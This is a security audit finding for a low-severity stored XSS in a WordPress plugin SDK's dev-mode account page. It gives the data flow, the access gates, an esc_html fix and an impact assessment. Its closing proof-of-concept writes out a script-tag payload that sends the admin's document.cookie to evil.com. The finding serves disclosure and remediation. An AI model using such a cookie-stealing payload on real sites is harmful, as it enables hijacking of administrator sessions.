# Stored XSS in SDK Dev-Mode Account Page via User Nickname

## Finding ID
wp-headers-and-footers-xss-013

## Severity
Low (CVSS 4.8) - downgraded from scanner's "high" due to dev-mode gate

## Vulnerability Class
Stored Cross-Site Scripting (XSS)

## Auth Required
Subscriber (to set nickname); Admin (to view the page); WPBRIGADE_SDK__DEV_MODE must be true

## Affected File
`lib/wpb-sdk/views/account.php` - Line 243

## Description

The WPBrigade SDK's account debug page echoes the WordPress user's nickname without HTML escaping:

```php
// account.php:243
<code><?php echo $Data['user_info']['user_nickname'] ?></code>
```

The `$Data` array is populated by `WPBRIGADE_Logger::get_logs_data($slug)` which collects the current WordPress user's profile information including their `user_nickname` field.

A lower-privileged user (subscriber) can set their WordPress profile nickname to contain JavaScript. If an administrator then navigates to the hidden "account" admin page, the unescaped nickname is rendered in the browser, executing the attacker's script in the admin's session.

## Data Flow

1. **Source**: `get_option('wpb_sdk_module_slug')` at `account.php:215`
2. **Propagation**: `$wpb->get_logs_data($slug)` at `account.php:219` - collects user profile data
3. **Sink**: `echo $Data['user_info']['user_nickname']` at `account.php:243` - unescaped output

## Access Controls Analysis

The page is only rendered when two conditions are met:
1. The user must be an admin (registered via `add_action('admin_menu', ...)` at `wpb-sdk-essential-functions.php:80`)
2. The constant `WPBRIGADE_SDK__DEV_MODE` must be defined and set to `true` (checked at `wpb-sdk-essential-functions.php:86`)

This constant is never defined by the plugin itself. It would only be set by a developer debugging the WPBrigade SDK, severely limiting real-world exploitability.

## Fix

Replace the unescaped echo with `esc_html()`:

```php
// Before:
<code><?php echo $Data['user_info']['user_nickname'] ?></code>

// After:
<code><?php echo esc_html( $Data['user_info']['user_nickname'] ) ?></code>
```

Same fix should be applied to all unescaped echoes in account.php (lines 243, 258, 283, 313, 354), though only line 243 (nickname) has a realistic user-controllable taint path.

## Real-World Impact Assessment

**Extremely low**. This requires:
- A site running this plugin with `WPBRIGADE_SDK__DEV_MODE` manually set to `true` (production sites would never do this)
- An attacker with at least subscriber-level access
- An admin navigating to a hidden debug menu page

This is a genuine coding defect (missing output escaping) but not a practical security risk in production environments.

## PoC Sketch

1. Attacker creates WordPress account (subscriber role)
2. Attacker edits profile, sets Nickname to: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
3. Prerequisite: `define('WPBRIGADE_SDK__DEV_MODE', true);` must be in wp-config.php
4. Admin navigates to the hidden "Account" page in wp-admin
5. XSS executes in admin context, stealing session cookies
